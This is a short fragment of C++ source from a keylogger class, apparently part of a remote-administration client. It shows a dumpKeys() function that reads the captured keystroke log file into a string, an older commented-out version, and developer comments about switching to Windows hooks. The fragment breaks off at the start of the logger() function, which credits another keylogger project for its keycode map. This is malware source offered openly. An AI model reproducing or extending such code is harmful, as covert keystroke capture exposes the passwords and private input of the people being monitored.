...
std::string Keylogger::dumpKeys() {
  /*										//JulianGi's
  original implementation, didn't work reliably and produced errors on testing.
  changed by werkamsus std::ifstream file; file.open(Settings::keylogPath);
  std::string keys;
  while (!file.eof())
  {
          file >> keys;
  ...
  */
  ...
  std::string keys((std::istreambuf_iterator<char>(stream)),
                   std::istreambuf_iterator<char>());
  return keys;
}

/*
Not sure if i want to repeatedly call functions 24/7 in the client, have to look
into a version with hooks and winapi (message loop) constantly opens and closes
a file 100x per second. really not optimal

*/
void Keylogger::
    logger() // keycode map taken from
             // https://github.com/TheFox/keylogger/blob/master/src/main.cpp
{
